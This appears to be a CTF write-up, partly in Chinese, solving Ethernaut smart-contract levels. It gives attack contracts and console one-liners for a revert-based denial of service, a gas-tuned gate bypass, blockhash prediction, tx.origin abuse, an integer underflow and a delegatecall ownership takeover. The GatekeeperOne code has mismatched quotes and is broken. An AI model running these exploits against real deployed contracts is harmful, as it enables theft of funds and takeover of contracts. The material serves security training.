 # Ethernaut  CTF
 
 [合约攻击CTF](https://ethernaut.openzeppelin.com/)
 
 
 
 # King
 
```
contract BadKing {
    King public king = King(YOUR_LEVEL_ADDR_HERE);
    
    // Create a malicious contract and seed it with some Ethers
    function BadKing() public payable {
    }
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing() public {
        address(king).call.value(1000000000000000000).gas(4000000)();
    }
    
    // This function fails "king.transfer" trx from Ethernaut
    function() external payable {
        revert("haha you fail");
    }
}
```

1. Create a BadKing contract and seed it with at least 1 Ether in the constructor:

2. Create a function to allow this BadKing to become the recognized King in King.sol, making sure to send at least 1 Ether to surpass the current prize.

3. Implement a payable fallback function which immediately reverts the transaction. Give it an error message (optional).
 
 
 # GatekeeperOne
 
```
contract Gatekeeperhack {
    address public _gateKey = tx.origin;
    bytes8 public _gateKey8 = bytes8(_gateKey);
    // Mask to build the right _gateKey parameter for gateThree modifier
    bytes8 public mask = 0xFFFFFFFF0000FFFF;

    bytes8 public _gateKey8Padded = _gateKey8 & mask; 

    GatekeeperOne target = GatekeeperOne('COPY YOUR ETHERNAUT INSTANCE ADDRESS TO BE HACKED HERE");

    function hack(){
        target.call.gas(32979)(bytes4(sha3("enter(bytes8)")),_gateKey8Padded);

    }
```


# Coinflip
```
contract Attack {
  CoinFlip fliphack;
  address instance_address = instance_address_here;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function Attack() {
    fliphack = CoinFlip(instance_address);
  }

  function predict() public view returns (bool){
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    return coinFlip == 1 ? true : false;
  }

  function hack() public {
    bool guess = predict();
    fliphack.flip(guess);
  }
}
```

# Telephone
代码很短，这里的考点是 tx.origin 和 msg.sender 的区别。

tx.origin 是交易的发送方。
msg.sender 是消息的发送方。
用户通过另一个合约 Attack 来调用目标合约中的 changeOwner()
此时，tx.origin 为 用户，msg.sender 为 Attack，即可绕过条件，成为 owner

```
contract Attack {
    address instance_address = instance_address_here;
    Telephone target = Telephone(instance_address);

    function hack() public {
        target.changeOwner(msg.sender);
    }
}
```

# Token
经典的整数溢出问题
在 transfer() 函数第一行 require 里，这里的 balances 和 value 都是 uint。此时 balances 为 20，令 value = 21，产生下溢，从而绕过验证，并转出一笔很大的金额。

`contract.transfer(player_address, 21)`

为了防止整数溢出，应该使用 require(balances[msg.sender] >= _value)
或是使用 OpenZeppelin 维护的 SafeMath 库来处理算术逻辑。

 
 
# Delegation

在本题中，Delegation 合约中的 delegatecall 函数参数可控，导致可以在合约内部执行任意函数，只需调用 Delegate 合约中的 pwn 函数，即可将 owner 变成自己。

`contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)});`


# Naught Coin
由于 NaughtCoin 子合约中并没有实现该接口，我们可以直接调用，从而绕开了 lockTokens() ，题目的突破口就在此。
需要注意的是，与 transfer() 不同，调用 transferFrom() 需要 msg.sender 获得授权。由于我们本就是合约的 owner，可以自己给自己授权。授权操作在接口文档里也有

`function approve(address _spender, uint256 _value) returns (bool success)`

还有一点，转账的目标账户不能是非法地址，所以需要部署一个第三方 NaughtCoin 合约。注意 import 的时候地址是 github 链接。
